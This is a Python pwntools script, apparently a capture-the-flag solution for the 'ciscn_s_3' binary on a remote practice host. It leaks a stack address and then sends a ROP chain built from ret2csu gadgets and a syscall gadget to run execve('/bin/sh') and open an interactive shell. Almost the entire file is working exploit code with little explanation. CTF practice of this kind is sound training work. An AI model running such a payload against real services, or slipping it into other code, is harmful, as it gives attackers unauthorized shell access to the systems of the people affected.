#!/usr/bin/python
#__author__:TaQini
# 1. leak stack
# 2. rop - SYS_exec(binsh,0,0)
from pwn import *

local_file  = './ciscn_s_3'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '/lib/x86_64-linux-gnu/libc.so.6'
remote_host  = 'node3.buuoj.cn'
remote_port = 27970

DEBUG = False 
# DEBUG = True

if DEBUG:
	p = process(local_file)
	libc = ELF(local_libc)
else: 
	p = remote(remote_host,remote_port)
	libc = ELF(remote_libc)
elf = ELF(local_file)

context.log_level = 'debug'

# info
# gadget
prdi = 0x00000000004005a3 # pop rdi ; ret
'''
   0x4004d6 <gadgets>:	push   rbp
   0x4004d7 <gadgets+1>:	mov    rbp,rsp
   0x4004da <gadgets+4>:	mov    rax,0xf
   0x4004e1 <gadgets+11>:	ret    
   0x4004e2 <gadgets+12>:	mov    rax,0x3b
   0x4004e9 <gadgets+19>:	ret    
   0x4004ea <gadgets+20>:	nop
   0x4004eb <gadgets+21>:	pop    rbp
   0x4004ec <gadgets+22>:	ret  
'''
gadget = 0x4004e2  # mov rax,0x3b; ret
syscall = 0x400517 # syscall; ret
'''
.text:0000000000400580                 mov     rdx, r13
.text:0000000000400583                 mov     rsi, r14
.text:0000000000400586                 mov     edi, r15d
.text:0000000000400589                 call    qword ptr [r12+rbx*8]
.text:000000000040058D                 add     rbx, 1
.text:0000000000400591                 cmp     rbx, rbp
.text:0000000000400594                 jnz     short loc_400580

.text:0000000000400596                 add     rsp, 8
.text:000000000040059A                 pop     rbx
.text:000000000040059B                 pop     rbp
.text:000000000040059C                 pop     r12
.text:000000000040059E                 pop     r13
.text:00000000004005A0                 pop     r14
.text:00000000004005A2                 pop     r15
.text:00000000004005A4                 retn
'''
m3c = 0x0400580
p6r = 0x040059A

# elf, libc
len = 16
main = elf.symbols['main']
vuln = 0x4004ed

# rop1
payload = '/bin/sh\0' + 'A'*8
payload += p64(vuln)

# gdb.attach(p,'b vuln')

p.sendline(payload)
data = p.recv(0x30)[0x20:0x28]
stack = u64(data)
log.info('leak: '+hex(stack))
# log.warning('--------------')
offset = 280
binsh = stack - offset
log.info('binsh = '+hex(binsh))

# rop2
# execve(binsh, 0,  0  )
#  regs:  rdi  rsi rdx

payload2 = '/bin/sh\0' + p64(gadget)
payload2 += p64(p6r) + p64(0) + p64(1) + p64(binsh+0x8) + p64(0) + p64(0) + p64(binsh)
payload2 += p64(m3c) + p64(0xdeadbeef)*7
payload2 += p64(prdi) + p64(binsh)
payload2 += p64(syscall)

p.sendline(payload2)

p.interactive()

